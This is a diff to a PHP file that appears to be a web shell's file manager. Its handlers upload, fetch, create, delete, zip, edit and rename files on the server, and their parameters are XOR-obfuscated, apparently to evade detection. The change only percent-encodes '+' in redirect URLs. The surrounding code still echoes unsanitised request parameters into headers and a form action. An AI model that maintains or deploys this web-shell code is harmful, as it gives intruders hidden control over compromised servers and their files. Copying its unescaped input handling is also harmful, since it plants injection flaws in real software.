@@ -2100,7 +2100,7 @@ if(isset($_FILES["fileToUpload"]))
 		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
 		{
 			echo "<p class='success'>The file ".basename($_FILES["fileToUpload"]["name"])." has been uploaded.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 		}
 		else
 		{
@@ -2163,7 +2163,7 @@ else if(isset($_POST["linkToDownload"]))
 				}
 
 				echo "<p class='success'>The file ".$filename." has been uploaded.</p>";
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 			}
 			catch(Exception $e)
 			{
@@ -2195,7 +2195,7 @@ else if(isset($_POST["mkdir"]))
 	if (!file_exists($dirname))
 	{
 		mkdir($dirname);
-		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 	}
 	else
 	{
@@ -2221,7 +2221,7 @@ else if(isset($_POST["mkfile"]))
 	if (!file_exists($filename))
 	{
 		fopen($filename, 'w');
-		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 	}
 	else
 	{
@@ -2243,7 +2243,7 @@ else if(isset($_GET["del"]))
 		else
 		{
 			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 		}
 	}
 	else
@@ -2255,7 +2255,7 @@ else if(isset($_GET["del"]))
 		else
 		{
 			echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
-			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 		}
 	}	
 }
@@ -2303,7 +2303,7 @@ else if(isset($_GET["zip"]))
 				if ($zipFail == False)
 				{
 					echo "<p class='success'>".unxor_this($_GET["zip"])." has been Ziped.</p>";
-					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]."#File Manager");
+					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["location"])."#File Manager");
 				}	
 			}
 		}
@@ -2349,7 +2349,7 @@ else if(isset($_GET["file"]))
 		$file = unxor_this(htmlentities($_GET["file"]));
 		$content = file_get_contents(unxor_this($_GET["file"]));
 		echo "
-			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."&location=".$_GET["location"]."#File Manager' method='POST'>
+			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."&location=".str_replace("+", "%2B", $_GET["location"])."#File Manager' method='POST'>
 				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
 				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
 			</form>";
@@ -2374,7 +2374,7 @@ else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
 			if(file_exists(unxor_this($_POST["new_name"])))
 			{
 				echo "<p class='success'>File successfully renamed!</p>";
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["dir"])."#File Manager");
 			}
 			else
 			{
@@ -2405,7 +2405,7 @@ else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
 			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
 			if(file_exists(unxor_this($_POST["new_name"])))
 			{
-				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]."#File Manager");
+				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".str_replace("+", "%2B", $_GET["dir"])."#File Manager");
 				echo "<p class='success'>File successfully renamed!</p>";
 			}
 			else
